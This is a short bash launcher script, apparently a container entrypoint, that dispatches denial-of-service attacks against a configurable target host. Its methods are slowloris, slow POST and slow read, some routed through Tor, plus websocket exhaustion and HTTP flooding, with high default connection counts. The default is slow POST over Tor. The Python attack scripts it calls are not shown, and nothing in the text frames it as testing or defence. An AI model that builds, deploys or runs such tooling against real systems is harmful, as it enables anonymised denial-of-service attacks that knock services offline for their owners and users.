#!/bin/bash
ATTACK="${ATTACK_METHOD:-slowpost_tor}"
echo "[${CONTAINER_NAME}] Launching ${ATTACK} against ${TARGET_HOST}..."

case "$ATTACK" in
    slowloris)     exec python3 /app/slowloris.py "${TARGET_HOST}" "${TARGET_PORT:-80}" "${CONNECTIONS:-500}" ;;
    slowloris_tor) exec python3 /app/slowloris_tor.py "${CONNECTIONS:-200}" ;;
    slowpost)      exec python3 /app/slowpost.py "${CONNECTIONS:-500}" ;;
    slowpost_tor)  exec python3 /app/slowpost_tor.py "${CONNECTIONS:-1000}" ;;
    slowread)      exec python3 /app/slowread.py "${CONNECTIONS:-20}" ;;
    ws_exhaust)    exec python3 /app/ws_exhaust.py "${CONNECTIONS:-500}" ;;
    http_flood)    exec python3 /app/http_flood.py "${CONNECTIONS:-200}" ;;
    *)             echo "[!] Unknown attack method: $ATTACK"; exit 1 ;;
esac
